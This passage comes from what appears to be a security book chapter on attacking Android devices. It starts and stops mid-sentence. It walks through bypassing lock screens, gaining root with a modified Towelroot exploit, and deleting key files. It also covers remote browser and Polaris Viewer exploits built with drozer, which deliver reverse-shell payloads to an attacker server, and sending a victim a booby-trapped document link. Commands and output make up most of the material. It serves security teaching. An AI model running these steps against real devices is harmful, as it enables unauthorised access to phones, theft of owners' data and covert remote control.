READ_SMS permission, the attacker will not have access to the associated content providers\nbecause he is unable to create and invoke any Java code from the Context class. Permissions that map directly to\nthe application UID being part of a group (e.g., READ_EXTERNAL_STORAGE) will allow the attacker to access the SD\ncard because this is within the constraints of a Linux shell. Typically, non-system applications do not have the\nability to install additional packages unless the compromised application holds the INSTALL_PACKAGES\npermission. If this is the case the attacker could use pm install to install a full malicious Android package.\nHowever, as mentioned previously drozer contains a payload called weasel that performs some tricks to be able\nto load a rogue drozer agent without installing an application. Using weasel, replacing the compromised\napplication's process in memory with that of a drozer agent is possible. However, the drozer agent will not be\nable to obtain Context. Context is a class that provides information about a particular application's environment.\nIt provides access to IPC functionality provided by Binder and allows the invocation of all the application\ncomponents. If an attacker's code is able to run and obtain Context then it is able to make use of the\npermissions granted to the application. drozer will detect whether the instance received has Context or not and\nadjust the available modules inside the console to only those that can work without Context.\nNon-System Application with Context\nAn exploit payload that is able to take over an application's execution flow and load its own arbitrary classes will\nbe able to retrieve application Context. An attacker would be able to leverage the permissions of the granted\napplication to perform post-exploitation tasks. For example, if the compromised application held the READ_SMS\npermission then the attacker's code would be able to query the content://sms content provider. When an\nattacker's code is able to obtain Context it is immediately a lot more dangerous than without it.\nInstalled Package\nAn installed package can request an arbitrary set of permissions and be granted them depending on the\nprotection level set on each. If an attacker is in a position to install any package, he will be able to reliably access\nanything that a third-party application developer would. This provides access to the device and its resources as\nspecified by its permissions.\nADB Shell Access\nAn ADB shell provides powerful access on a device. It provides the ability to install additional packages, interact\nwith applications as a developer, and gain access to a multitude of additional attack vectors that installed\napplications cannot.\nSystem User Access\nSystem user access on a device means that an attacker's code is running as the “system” user. This is the same\nuser that is used for very sensitive OS functionality. The system user can install new packages, manipulate\ndevice configuration settings, and access data from any application's private data directory. An attacker who has\ngained this level of access can compromise almost all aspects of the device and its security.\nRoot User Access\nRoot access is the ultimate access that can be gained on a UNIX-based system. An attacker who has root access\ncan manipulate absolutely any aspect of the device. This includes installing additional packages, reading and\nwriting to device memory, and manipulating absolutely any other aspect of the device.\nPractical Physical Attacks\nThis section focuses on gaining access to a device that you have in your possession. This section also assumes\nno prior knowledge of the lock screen password or PIN. If you have the password or PIN of the lock screen then\nyou have unfettered access to the device and should skip to the “Infiltrating User Data” section after installing\nyour remote administration tool of choice.\nGetting ADB Shell Access\nGetting an ADB shell on a device is the easiest way to gain access to information on the device or launch further\nattacks against it. Two predominant ways exist to get an ADB shell when you have not gotten past the lock\nscreen of a device.\nUSB Debugging\nAndroid devices have a feature called USB debugging that allows ADB access from a computer to a connected\ndevice. Most Android devices come with USB debugging turned off by default. Enabling USB debugging opens a\ndevice to attack from physical access. Simply using the following command allows access to a connected device\nthat has USB debugging enabled:\n$ adb shell\nshell@android:/ $\nADB access to a device allows the exposure of data on the device as well as the installation of new packages.\nTherefore, in versions of Android including 4.2.2 and newer, a security feature was added that helped secure\nagainst an attacker having physical access to a device with USB debugging enabled. A prompt appears to the user\nwhen he connects his computer to a device that has USB debugging enabled. Figure 8.1 shows an example of\nthis prompt.\nFigure 8.1 The prompt shown to the user when a device with USB debugging is connected to his computer\nAttempting to use adb shell when a device is locked results in the following error on the terminal:\nerror: device unauthorized. Please check the confirmation dialog on your\ndevice\nThis means that it is not possible to connect a phone and interact with ADB without first getting past the lock\nscreen.\nHowever, on February 26, 2014, Henry Hoggard from MWR InfoSecurity reported a bug to Google revealing a\nway to bypass this prompt on versions of Android including 4.2.2 up until 4.4.2. By navigating to the emergency\ndialer or lock screen camera and then initiating the connection with ADB, the authorization prompt still showed,\neven though the screen was locked. Sometimes to kickstart the authorization prompt you need to perform an\nadb kill-server and then adb shell again. This issue is documented at\nhttps://labs.mwrinfosecurity.com/advisories/2014/07/03/android-4-4-2-secure-usb-debugging-bypass/.\nThis means that this method of exploiting devices works on all Android versions up to and including 4.4.2.\nNOTE\nThe privilege level associated with an ADB shell is controlled by a configuration value named ro.secure.\nOn devices prior to Android 4.2, this was present in /data/local.prop and on newer devices it has shifted\nto /default.prop. Setting this value to 0 will result in adbd running as root. On a production build of a\ndevice, the default value is set to 1, which makes adbd run as the shell user. An interesting technique for\nescalating privileges from the system user to root prior to Android 4.2 is writing ro.secure=0 into\n/data/local.prop. This is because /data/local.prop was owned by the system user. Since Android 4.2,\n/data/local.prop has been removed, and /default.prop is owned by the root user. However, further\nimprovements have been made and modifying /default.prop will not work from Android 4.3 onwards.\nThis is because now a compile-time flag named ALLOW_ADBD_ROOT indicates whether ADB can be run as\nroot. If the version of the adbd binary running on the device is compiled with this flag, it will disregard the\nro.secure value set. The fix for this is to compile a custom version of adbd that does not contain this check\nand overwrite the version of this binary on the device. These techniques are useful for maintaining\npersistent root access after it has been obtained on a device.\nUnlocked Bootloaders\nSome device manufacturers allow users to unlock their bootloaders and flash or boot into custom images on the\ndevice. To unlock the bootloader on a Nexus device, you can use the following command when the device is\ndisplaying the bootloader:\n$ fastboot oem unlock\n...\n(bootloader) erasing userdata...\n(bootloader) erasing userdata done\n(bootloader) erasing cache...\n(bootloader) erasing cache done\n(bootloader) unlocking...\n(bootloader) Bootloader is unlocked now.\nOKAY [ 40.691s]\nfinished. total time: 40.691s\nWhen unlocking a bootloader, the Android OS forces a factory reset and all user data is wiped. This prevents\nattackers from simply booting into custom system images that provide access to the device's data. However,\nsome users may forget to lock their bootloader again after they have flashed a custom image, which leaves it\nwide open for an attacker who has physical access to the device. Booting into a custom recovery ROM and\ngaining an ADB shell running as root is possible. The following list explains this attack for a Nexus 7 device.\n1. If the device is still powered on, turn it off.\n2. Hold down the volume down key and power at the same time to boot into the bootloader.\n3. The bootloader appears, with a screen displaying Start.\n4. If you see LOCK STATE - UNLOCKED, the device has an unlocked bootloader and is vulnerable to attack. A\ndevice with an unlocked bootloader will also display an unlocked padlock on the screen when booting up.\n5. Download the correct ClockworkMod Recovery ROM (see https://www .clockworkmod.com/rommanager)\nimage for the device.\n6. Boot into the image by performing the following:\n$ fastboot boot recovery-clockwork-touch-6.0.4.3-grouper.img\ndownloading 'boot.img'...\nOKAY [ 0.875s]\nbooting...\nOKAY [ 0.019s]\nfinished. total time: 0.895s\nIf the bootloader is locked, this step will fail with a “Bootloader is locked” error message.\n7. You should now see the ClockworkMod Recovery screen. At this point you are able to invoke a root ADB\nshell.\n$ adb devices\nList of devices attached\n015d25687830060c recovery\n$ adb shell\n~ # id\nuid=0(root) gid=0(root)\nPerforming this technique can be cumbersome depending on the device manufacturer. Some device\nmanufacturers make use of their own bootloaders and proprietary tools to interact with them. You would have\nto investigate this possibility for the device in question.\nBypassing Lock Screens\nIf the intent is not to compromise the device long term and maintain access but merely to get access to it, then\nuse the information in this section, which delves into some ways to bypass the lock screen on a device. No\nforensic techniques involving observing smudges on a device to determine touches will be discussed.\nUsing the DISABLE_KEYGUARD Permission\nAndroid contains a permission called DISABLE_KEYGUARD that allows applications holding this permission to\nremove the lock screen temporarily. You can do this inside an application by implementing the following code:\nKeyguardManager kgm = ((KeyguardManager)getSystemService(\"keyguard\"));\nKeyGuardManager.KeyguardLock kgl = kgm.newKeyguardLock(\"mahh\");\nkgl.disableKeyguard();\nEven though the KeyguardManager.KeyguardLock class was deprecated in API 13 (Android 3.2), this technique\ncontinues to work on the latest Android devices. By using a post-exploitation module in drozer with\nKeyguardManager .KeyguardLock, a hacker can disable the lock screen. The rogue drozer agent by default assigns\nthe DISABLE_KEYGUARD permission, but the person using the rogue agent must have somewhere to host a server\nfor the agent to connect to. Rather, to do this on a device with USB debugging enabled and a standard drozer\nagent, you can compile a new agent with the DISABLE_KEYGUARD permission as follows:\n$ drozer agent build --permission android.permission.DISABLE_KEYGUARD\nDone: /tmp/tmpW5TSbA/agent.apk\nInstall the agent and start the embedded server, which opens a listening port on the device:\n$ adb install /tmp/tmpW5TSbA/agent.apk\n3498 KB/s (653640 bytes in 0.182s)\npkg: /data/local/tmp/agent.apk\nSuccess\n$ adb shell am broadcast -n com.mwr.dz/.receivers.Receiver -c\ncom.mwr.dz.START_EMBEDDED\nBroadcasting: Intent { cat=[com.mwr.dz.START_EMBEDDED]\ncmp=com.mwr.dz/.receivers.Receiver }\nBroadcast completed: result=0\nThe listening embedded server port must be forwarded to the connected computer:\n$ adb forward tcp:31415 tcp:31415\nRunning the post.perform.disablelockscreen module disables the device's lock screen:\n$ drozer console connect -c \"run post.perform.disablelockscreen\"\nSelecting 4f804a5a07bbb229 (unknown sdk 4.4.2)\n[*] Attempting to disableKeyguard()\n[*] Done. Check device.\nThe last step assumes that the relevant post module is already installed in drozer by doing module install\ndisablelockscreen. The lock screen can be re-enabled by pressing the home button on the device. This\ntechnique was tested on an Android 4.4.2 emulator and multiple devices running versions up to 5.0 Lollipop and\nproves to reliably remove the lock screen.\nRemoving Key Files\nIf a pattern lock screen is set on a device, a file located at /data/system/gesture .key stores a representation of\nthis pattern. In the same way, a device using a PIN or password lock screen stores a salted hash of it in\n/data/system/password .key. Removing these files will disable the lock screen entirely. The file permissions set\non these files are as follows:\n-rw------- system system 20 2014-11-03 15:10 gesture.key\n...\n-rw------- system system 72 2014-11-03 15:10 password.key\nObserving the owner, group, and permissions set on these files reveals only the system or root user will be able\nto delete them. This means a hacker has to find a way on the device to escalate privileges from the shell user to\neither system or root. The target for this exercise is a Sony Xperia Z2 running Android 4.4.2. This device is not\nvulnerable to any of the Master Key vulnerabilities; otherwise, Cydia Impactor could be used to escalate\nprivileges to the system user.\nInstead take a look at the kernel version in use on this device:\nshell@D6503:/ $ cat /proc/version\nLinux version 3.4.0-perf-g46a79a0 (BuildUser@BuildHost) (gcc version 4.7\n(GCC) ) #1 SMP PREEMPT Wed Mar 5 20:49:56 2014\nChapter 6 covered a kernel exploit dubbed Towelroot that claims to be able to exploit all kernel versions\ncompiled prior to June 16, 2014. However, the official version of Towelroot is inside an application without any\nclear paths to executing it from an ADB shell. An alternate standalone version of this exploit that is based on an\nearly version of Towelroot is available at https://gist.github.com/fi01/a838dea63323c7c003cd. It requires\nslight alterations to the following line:\nret = system(\"/system/bin/touch /data/local/tmp/foo\");\nThis line should rather execute /system/bin/sh to provide a root shell. After making this change you can\ncompile this code by creating a standard NDK folder structure and running ndk-build from the root. You can\nupload the resulting binary (named exploit in this instance) to the device to the /data/local/tmp directory,\nmarked as executable and then run to obtain a root shell:\n$ adb push exploit /data/local/tmp\n342 KB/s (17792 bytes in 0.050s)\n$ adb shell\nshell@D6503:/ $ cd /data/local/tmp\nshell@D6503:/data/local/tmp $ chmod 775 exploit\nshell@D6503:/data/local/tmp $ ./exploit\n************************\nnative towelroot running with pid 4335\ngot kernel version Linux version 3.4.0-perf-g46a79a0 (BuildUser@BuildHos\nt) (gcc version 4.7 (GCC) ) #1 SMP PREEMPT Wed Mar 5 20:49:56 2014\ngot kernel number 0\nno matching phone found, trying default\ni have a client like hookers\nstarting the dangerous things\n0xf1d78000 is a good number\ncpid1 resumed\n0xf1d7ddcc is also a good number\n0xf1d8a000 is a good number\ncpid1 resumed\n0xf1d8ddcc is also a good number\nGOING\ncpid3 resumed\nWOOT\nYOU ARE A SCARY PHONE\nshell@D6503:/data/local/tmp # id\nuid=0(root) gid=0(root) groups=1004(input),1007(log),1009(mount),1011(ad\nb),1015(sdcard_rw),1028(sdcard_r),2991(removable_rw),3001(net_bt_admin),\n3002(net_bt),3003(inet),3006(net_bw_stats) context=u:r:kernel:s0\nAt this point, a root shell is more than sufficient to remove the lock screen:\nshell@D6503:/data/local/tmp # rm /data/system/password.key\nFigure 8.2 shows a screenshot of the device before and after executing this command.\nFigure 8.2 A screenshot of a Sony Xperia Z2 before and after having the password lock screen removed\nOn older devices, making use of Cydia Impactor offers an excellent option that reliably provides system user\naccess with physical access. This tool and family of vulnerabilities it exploits was discussed in the Chapter 6\nsection, “Rooting Explained.” The particular option in Cydia Impactor that provides system user access is Start\nTelnetd as System on Port 2222. This option initiates a shell on TCP/2222 that is running as the system user.\nThis port can be forwarded to the local computer using ADB and then connected to with a telnet client to obtain\nsystem user access. Another example of a trivial vulnerability that would allow system user access is if any\ndebuggable application on the device were running as the system user. Chapter 7's section, “Exploiting\nMisconfigured Package Attributes” covered exploitation of this issue.\nGaining root access and removing a key file is possible if the victim has unlocked her bootloader and forgotten\nto lock it again. If you use the method shown earlier of loading ClockworkMod (CWM) on a Nexus device and\ngetting a root ADB shell, the key file can be removed. Make sure that you have mounted the /data partition by\nnavigating to Mounts and Storage and clicking mount /data. Using an ADB shell from CWM, you can remove all\nkey files as follows:\n~ # rm /data/system/*.key\n~ # reboot\nThe device will now reboot and still show the lock screen. However, it will accept any pin, password, or pattern\nyou use and log you into the device.\nAbusing Android Application Issues\nAs mentioned in “Exploiting Activities” in Chapter 7, Curesec discovered a vulnerability in the\ncom.android.settings package that can be used to remove the device lock screen. This affects all devices\nrunning Android 4.3 or earlier. To find the vulnerability details, search for CVE-2013-6271 or get more\ninformation from the authors on their blog at https://cureblog.de/2013/11/cve-2013-6271- remove-device-\nlocks-from-android-phone/. To abuse this vulnerability and remove the lock screen of a device, perform the\nfollowing in an ADB shell:\nshell@android:/ $ am start -n com.android.settings/com.android.settings.\nChooseLockGeneric --ez confirm_credentials false --ei\nlockscreen.password_type 0 --activity-clear-task\nStarting: Intent { flg=0x8000 cmp=com.android.settings/\n.ChooseLockGeneric (has extras) }\nThis works from any context and can also be invoked using an installed drozer agent by making use of the\nmodule provided by Curesec for this issue. You can install it by performing module install curesec.cve-2013-\n6271. Note that this will not work from an ADB shell provided from abusing an unlocked bootloader because it\nrelies on the Android system being operational and able to receive intents.\nUsing Logic Flaws that Don't Require Shell Access\nIf you consider it, a lock screen is a complicated piece of software. It has to take into consideration when a user\nis allowed to interact with the device. Especially when you consider that a user is able to do some actions on the\ndevice from the lock screen, such as place emergency phone calls, receive phone calls, and allow third-party\napplications to temporarily disable the lock screen or show another activity in front of it. Complicated logic is\noften prone to flaws that can be used to do something that is not intended by the developer. For instance, on a\nMotorola Droid device bypassing the lock screen was possible by phoning the locked device and answering the\ncall. Then while the call was active, you simply pressed the back button and you were able to access the device.\nThis occurred because the phone application disabled the keyguard when receiving a call and the user could\nback out of it like any other application on the device. This was found and documented at\nhttps://theassurer.com/p/756.html. You can find many similar issues on the Internet documenting logic flaws\nin the lock screen on certain devices. The way that third-party applications handle being displayed over the lock\nscreen can also introduce lock screen bypass vulnerabilities. For example, in 2013 a vulnerability was reported\nin a free messaging and calling application named Viber (see http://www.viber.com/) that worked in exactly the\nsame way as the Motorola vulnerability. Sending a Viber message to a locked device causes Viber to display the\nmessage over the lock screen. It was then possible to bypass the lock screen completely by tapping the back\nbutton multiple times. To see a video of this exploit in action by BkavCorp visit http://www\n.youtube.com/watch?v=tb4y_1cz8WY.\nUsing Legitimate Lock Screen Reset Functionality\nAndroid has its own built-in mechanisms to help users who have forgotten their lock screen password. However,\nthis requires some form of authentication. Two general techniques work on Android devices and both of them\nrequire the user's Google username and password:\nEntering the password, PIN, or pattern incorrectly five times on the lock screen causes a new button to\nappear on the lock screen that says something like “Forgot pattern?” This button opens a screen for entering\nthe credentials for a linked Google account and changing the lock screen. Figure 8.3 shows the Forgot\npattern? button and the screen that asks for Google credentials.\nIf the user has enabled the Android Device Manager on their device then the user could visit\nhttps://www.google.com/android/devicemanager and control aspects of the device. Using the user's Google\ncredentials to log in to this interface shows a list of connected devices and allows the user or attacker that\nhas stolen these credentials somehow to reset the lock screen on any of them. Figure 8.4 shows the Device\nManager web interface after clicking the Lock button and the message presented on the locked device.\nFigure 8.3 Showing the Forgot pattern? button and the resulting screen by pressing it\nFigure 8.4 The Android Device Manager Lock functionality and the resulting screen of the locked device\nThere may also be ways to reset a device's lock screen specific to a device or manufacturer. Some manufacturers\nlike to include their own applications on devices and this could very well include functionality to reset the lock\nscreen. You would have to investigate this for the device in question but it would almost certainly require a form\nof authentication similar to the standard Android equivalents. If appropriate authentication is not required to\nperform a reset using one of these custom features, it is considered a vulnerability in itself.\nInstalling a Rogue drozer Agent through ADB\nAfter you have an ADB shell, you will be able to install tools on the device that allow you to access them\nremotely. A rogue drozer agent could be generated and installed on the device with ADB access. However, the\nagent would have to be started for the first time from ADB as well because Android applications are disabled by\ndefault when they are installed. To kickstart the agent you can invoke it using one of the ways mentioned in the\n“Rogue Agents” section earlier in this chapter. The most reliable way to install a rogue agent on modern devices\nis starting its service as follows:\nshell@android:/ $ am startservice -n com.mwr.dz/.Agent\nYou can find an automated drozer module that can install a rogue agent very quickly and invoke it at\nexploit.usb.socialengineering.usbdebugging. Here is an example of using it:\n$ drozer exploit build exploit.usb.socialengineering.usbdebugging\n--server 192.168.1.102\n[*] Building Rogue Agent...\n[*] Checking adb setup...\n[+] adb is set up correctly\n[*] Connect device and press [ENTER]\n[*] Attempting to install agent...\n[+] Rogue Agent installed\n[*] Attempting to kick start drozer agent - Method 1 (Service)\n[+] Service started. You should have a connection on your server\nDirectly after the service starts, a new drozer session is established with the drozer server:\n2014-10-30 21:16:28,925 - drozer.server.protocols.drozerp.drozer - INFO\n- accepted connection from 5fe89aa7ae424b6\nPerforming this method from an ADB shell obtained through exploiting an unlocked bootloader will not work.\nInstead, the focus should be to bypass the lock screen and obtain an ADB shell on the working system. From the\nexploited bootloader you can push a new application and essentially “install” it by simply placing a new APK into\nthe /data/app/ directory on the device via ADB. However, you would need to find another method to invoke the\nagent and enable it for the first run.\nPractical Remote Attacks\nKnowing which attacks will work against a particular target and the various versions of Android is what makes a\nsuccessful hacker. This section presents a practical hands-on approach to hacking Android devices remotely.\nKnowing the steps a hacker has to take helps security professionals develop ways to prevent attacks.\nRemote Exploits\nRemote exploits are the ideal attack for someone wanting to stay anonymous. They can be launched over the\nInternet seemingly without repercussions and tracing their origin is difficult. We cover examples of remote\nexploits and use them to explore three modes of exploitation with drozer's payload:\nLoading a drozer JAR that loads a limited agent\nInstalling and starting a rogue drozer agent by abusing INSTALL_PACKAGES\nLoading a drozer JAR that is passed Context\nThese modes will be explored respectively in each subsection.\nBrowser Memory Corruption\nMemory corruption exploits are some of the most technical exploits in existence. People are constantly targeting\nusers' browsers for exploitation, and this also means that Google has spent a lot of time and money ramping up\nexploit mitigations. Browser exploits on the latest versions of Android have to be crafted to bypass several\nexploit mitigations as well as trigger the vulnerability reliably. Let us rewind back to simpler times for exploit\nwriters when hardly any exploit mitigations were implemented. CVE-2010-1759 is a WebKit vulnerability in the\nDOM normalize method reported by Mark Dowd. We do not delve into the technicalities of the exploit but\nrather just use a drozer exploit on an Android 2.2 device.\nTo begin, you would need to start a drozer server and use the exploit module for this issue at\nexploit.remote.browser.normalize with a reverse TCP weasel payload. To push the exploit to a drozer server,\nuse the following command:\n$ drozer exploit build exploit.remote.browser.normalize --payload\nweasel.reverse_tcp.armeabi --server 192.168.1.112 --push-server\n127.0.0.1 --resource /\nUploading weasel to /weasel and W... [ OK ]\nPackaging an Agent... (this may take some time)\nUploading the Agent to /agent.apk and A... [ OK ]\nUploading blank page to /... [ OK ]\nUploading Exploit to /... [ OK ]\nDone. The exploit is available on: http://192.168.1.112:31415/\nThe --push-server means that you want to push the exploit pages to the drozer server, which is on your local\ncomputer but specifying --server as the network IP address where the weasel payload must call back to. If you\nspecify the --server as 127.0.0.1, then when the exploit payload executes it tries to connect to itself rather than\nthe drozer server. This is useful if you are exposing the drozer server to the Internet and want to push the\nexploit resources to it from your internal network.\nBrowsing to this server from an Android 2.2 device yields the following in the drozer server log and promptly\ncloses the browser:\n2014-11-09 15:02:03,914 - drozer.server.protocols.http - INFO - GET /\n2014-11-09 15:02:26,221 - drozer.server.protocols.byte_stream - INFO -\nMAGIC W\n2014-11-09 15:02:26,461 - drozer.server.protocols.shell - INFO -\naccepted shell from 192.168.1.112:46376\n2014-11-09 15:02:26,465 - drozer.server.protocols.http - INFO - GET\n/agent.jar\n2014-11-09 15:02:26,470 - drozer.server.protocols.http - INFO - GET\n/agent.apk\n2014-11-09 15:02:28,416 - drozer.server.protocols.drozerp.drozer - INFO\n- accepted connection from 1rp1edub6ieru\nThis output tells you two things: You got a normal reverse shell connection connected to the drozer server as\nwell as a proper drozer connection. Querying the server confirms the drozer connection:\n$ drozer console devices\nList of Bound Devices\nDevice ID Manufacturer Model Software\n1rp1edub6ieru unknown unknown unknown\nConnecting to the instance shows that the prompt is dz-limited>, and typing permissions confirms that you\nhave no Context:\n$ drozer console connect 1rp1edub6ieru\n.. ..:.\n..o.. .r..\n..a.. . ....... . ..nd\nro..idsnemesisand..pr\n.otectorandroidsneme.\n.,sisandprotectorandroids+.\n..nemesisandprotectorandroidsn:.\n.emesisandprotectorandroidsnemes..\n..isandp,..,rotectorandro,..,idsnem.\n.isisandp..rotectorandroid..snemisis.\n,andprotectorandroidsnemisisandprotec.\n.torandroidsnemesisandprotectorandroid.\n.snemisisandprotectorandroidsnemesisan:\n.dprotectorandroidsnemesisandprotector.\ndrozer Console (v2.3.4)\ndz-limited> permissions\nHas ApplicationContext: NO\nThis type of session disables all functionality that requires Context but still has useful tools for pilfering files off\nthe device and escalating privileges. With this session you can get a normal shell by typing:\ndz-limited> shell\n$ id\nuid=10019(app_19) gid=10019(app_19) groups=1015(sdcard_rw),3003(inet)\n$ exit\nThis spawns a shell session from within drozer. However, let us turn back to the other reverse shell connection\nwe got on the drozer server. You can interact with it by connecting to the drozer server with netcat or telnet as\nfollows and typing COLLECT:\n$ nc 127.0.0.1 31415\nCOLLECT\ndrozer Shell Server\n-------------------\nThere are 1 shells waiting...\n192.168.1.112:46376\nShell: 192.168.1.112:46376\nSelecting Shell: 192.168.1.112:46376\n$ id\nuid=10019(app_19) gid=10019(app_19) groups=1015(sdcard_rw),3003(inet)\n$ ^C\nTerminating the shell with Control+C instead of typing exit is very important. Typing exit will actually close\nthe shell connection with the remote victim. Admittedly, this example is quite old. However, there has been a\ndecline in memory corruption exploits for the Android browser being released publicly in the past years. The\nexploitation concepts and the use of drozer would be exactly the same as shown in the example here; however,\nthe internals of the exploit would be far more sophisticated.\nPolaris Viewer Memory Corruption\nPolaris Viewer is an application that was created by Infraware to read office documents and PDFs. It comes pre-\ninstalled on some devices by default because the manufacturer has agreements with Infraware. At Mobile\nPwn2Own in 2012, a team from MWR InfoSecurity demonstrated an exploit against a Samsung Galaxy S3. This\nwas in fact an exploit affecting Polaris Viewer via a crafted DOCX file. There was a stack-based overflow in the\nparsing of the adj tag of a VML shape that took place in the bundled native Polaris library. Taking control of the\nPolaris Viewer process was possible by exploiting this vulnerability. However, it was also found that the\napplication held the INSTALL_PACKAGES permission. This meant that after code execution was obtained, an\narbitrary new application could also be installed on the device.\nAn exploit for this issue is present in drozer as the\nexploit.remote.fileformat.polarisviewerbof_browserdelivery module. This exploit hosts the malicious\ndocument on a drozer server as well as an extra file named auth.bin. These files are automatically downloaded\nwhen you visit the drozer server from the phone's browser. The auth.bin file is present because of the way the\nexploit works. All that the exploit does is set up the call to execute an external script file, which in this case is\nauth.bin. This was done out of necessity because of the exploit mitigations present on the Galaxy S3 that made\nexploitation difficult. As a result of the exploit mitigations, the exploit in drozer is also dependent on a certain\nlinker being present on the device—particularly, the linker provided by T-Mobile for this exact compiled\nversion of the device software. To set up this attack using drozer you would need to start a drozer server and\nthen upload the resources to it as follows:\n$ drozer exploit build exploit.remote.fileformat.polarisviewerbof\n_browserdelivery --payload weasel.shell.armeabi --server 192.168.1.112\nUploading weasel to /weasel and W... [ OK ]\nPackaging an Agent... (this may take some time)\nUploading the Agent to /agent.apk and A... [ OK ]\nUploading blank page to /... [ OK ]\nUploading shell script to auth.bin... [ OK ]\nUploading document to /download.docx... [ OK ]\nUploading web delivery page to \\/view\\.jsp\\?token\\=iSI2hvwNosnZiWoq...\n[ OK ]\nDone. Exploit delivery page is available on:\nhttp://192.168.1.112:31415/view.jsp?token=iSI2hvwNosnZiWoq\nThe victim who has a vulnerable device can now be sent this “unique” link to click on and download her\nawaiting document. After she does this, her browser will automatically download the malicious documents and\nthe accompanying exploit that writes out weasel using shell commands. When the user visits the website, the\ndrozer server shows the following log entries:\n2014-11-09 21:49:42,320 - drozer.server.protocols.http - INFO - GET /\n2014-11-09 21:49:49,112 - drozer.server.protocols.http - INFO - GET /\n2014-11-09 21:51:10,112 - drozer.server.protocols.http - INFO - GET\n/view.jsp?token=iSI2hvwNosnZiWoq\n2014-11-09 21:51:10,309 - drozer.server.protocols.http - INFO - GET\n/auth.bin\n2014-11-09 21:51:10,828 - drozer.server.protocols.http - INFO - GET\n/auth.bin\n2014-11-09 21:51:17,381 - drozer.server.protocols.http - INFO - GET\n/download.docx\n2014-11-09 21:51:17,580 - drozer.server.protocols.http - INFO - GET\n/download.docx\nAt this point the user has received both files. Figure 8.5 shows screenshots of how this looks from the user's\nperspective.\nFigure 8.5 A Samsung Galaxy S3 device visiting the exploit page and receiving the exploit files\nIf the user tries to open auth.bin, nothing will happen because the device has no application to open .bin files.\nIf the user opens the download.docx it will trigger the exploit chain and the device will be compromised. After\nthe document opens, the drozer server log shows the following:\n2014-11-09 21:52:30,906 - drozer.server.protocols.shell - INFO -\naccepted shell from 192.168.1.109:48592\n2014-11-09 21:52:30,907 - drozer.server.protocols.http - INFO - GET\n/agent.jar\n2014-11-09 21:52:30,909 - drozer.server.protocols.http - INFO - GET\n/agent.apk\n2014-11-09 21:52:31,964 - drozer.server.protocols.drozerp.drozer - INFO\n- accepted connection from 3493i4n3ibqrl\n2014-11-09 21:52:37,356 - drozer.server.protocols.drozerp.drozer - INFO\n- accepted connection from 1b6b125f54bdda30\nWe got three connections from this device! One is a normal reverse shell connection and the other two are\ndrozer connections. Querying the drozer server for the connected devices reveals the following:\n$ drozer console devices\nList of Bound Devices\nDevice ID Manufacturer Model Software\n1b6b125f54bdda30 samsung GT-I9300 4.0.4\n3493i4n3ibqrl unknown unknown unknown\nThe first entry is a drozer connection where it was able to retrieve the manufacturer, model, and software\nversion. This means that the exploit must have been able to install the full drozer exploit agent and obtain\nContext. This is plausible because the Polaris Viewer application held the INSTALL_PACKAGES permission.\nConnecting to the session confirms this:\n$ drozer console connect 1b6b125f54bdda30\n.. ..:.\n..o.. .r..\n..a.. . ....... . ..nd\nro..idsnemesisand..pr\n.otectorandroidsneme.\n.,sisandprotectorandroids+.\n..nemesisandprotectorandroidsn:.\n.emesisandprotectorandroidsnemes..\n..isandp,..,rotectorandro,..,idsnem.\n.isisandp..rotectorandroid..snemisis.\n,andprotectorandroidsnemisisandprotec.\n.torandroidsnemesisandprotectorandroid.\n.snemisisandprotectorandroidsnemesisan:\n.dprotectorandroidsnemesisandprotector.\ndrozer Console (v2.3.4)\ndz> permissions\nHas ApplicationContext: YES\nAvailable Permissions:\n- android.permission.ACCESS_COARSE_LOCATION\n- android.permission.ACCESS_FINE_LOCATION\n- android.permission.ACCESS_LOCATION_EXTRA_COMMANDS\n- android.permission.ACCESS_MOCK_LOCATION\n- android.permission.ACCESS_NETWORK_STATE\n- android.permission.ACCESS_WIFI_STATE\n- android.permission.AUTHENTICATE_ACCOUNTS\n- android.permission.BATTERY_STATS\n- android.permission.BLUETOOTH\n- android.permission.BLUETOOTH_ADMIN\n- android.permission.BROADCAST_STICKY\n- android.permission.CALL_PHONE\n- android.permission.CAMERA\n- android.permission.CHANGE_CONFIGURATION\n- android.permission.CHANGE_NETWORK_STATE\n- android.permission.CHANGE_WIFI_MULTICAST_STATE\n- android.permission.CHANGE_WIFI_STATE\n- android.permission.CLEAR_APP_CACHE\n- android.permission.DISABLE_KEYGUARD\n- android.permission.EXPAND_STATUS_BAR\n- android.permission.FLASHLIGHT\n- android.permission.GET_ACCOUNTS\n- android.permission.GET_PACKAGE_SIZE\n- android.permission.GET_TASKS\n- android.permission.INTERNET\n- android.permission.KILL_BACKGROUND_PROCESSES\n- android.permission.MANAGE_ACCOUNTS\n- android.permission.MODIFY_AUDIO_SETTINGS\n- android.permission.MOUNT_FORMAT_FILESYSTEMS\n- android.permission.MOUNT_UNMOUNT_FILESYSTEMS\n- android.permission.NFC\n- android.permission.PERSISTENT_ACTIVITY\n- android.permission.PROCESS_OUTGOING_CALLS\n- android.permission.READ_CALENDAR\n- android.permission.READ_CONTACTS\n- android.permission.READ_LOGS\n- android.permission.READ_PHONE_STATE\n- android.permission.READ_PROFILE\n- android.permission.READ_SMS\n- android.permission.READ_SOCIAL_STREAM\n- android.permission.READ_SYNC_SETTINGS\n- android.permission.READ_SYNC_STATS\n- android.permission.READ_USER_DICTIONARY\n- android.permission.RECEIVE_BOOT_COMPLETED\n- android.permission.RECEIVE_MMS\n- android.permission.RECEIVE_SMS\n- android.permission.RECEIVE_WAP_PUSH\n- android.permission.RECORD_AUDIO\n- android.permission.REORDER_TASKS\n- android.permission.RESTART_PACKAGES\n- android.permission.SEND_SMS\n- android.permission.SET_ANIMATION_SCALE\n- android.permission.SET_DEBUG_APP\n- android.permission.SET_PROCESS_LIMIT\n- android.permission.SET_TIME_ZONE\n- android.permission.SET_WALLPAPER\n- android.permission.SET_WALLPAPER_HINTS\n- android.permission.SIGNAL_PERSISTENT_PROCESSES\n- android.permission.SUBSCRIBED_FEEDS_READ\n- android.permission.SUBSCRIBED_FEEDS_WRITE\n- android.permission.SYSTEM_ALERT_WINDOW\n- android.permission.USE_CREDENTIALS\n- android.permission.USE_SIP\n- android.permission.VIBRATE\n- android.permission.WAKE_LOCK\n- android.permission.WRITE_CALENDAR\n- android.permission.WRITE_CONTACTS\n- android.permission.WRITE_EXTERNAL_STORAGE\n- android.permission.WRITE_PROFILE\n- android.permission.WRITE_SMS\n- android.permission.WRITE_SOCIAL_STREAM\n- android.permission.WRITE_SYNC_SETTINGS\n- android.permission.WRITE_USER_DICTIONARY\nThe permissions granted to this agent are shown in the previous output. A tremendous amount of control can be\nexpressed over this device with this level of access. What exactly can be done with this level of access is 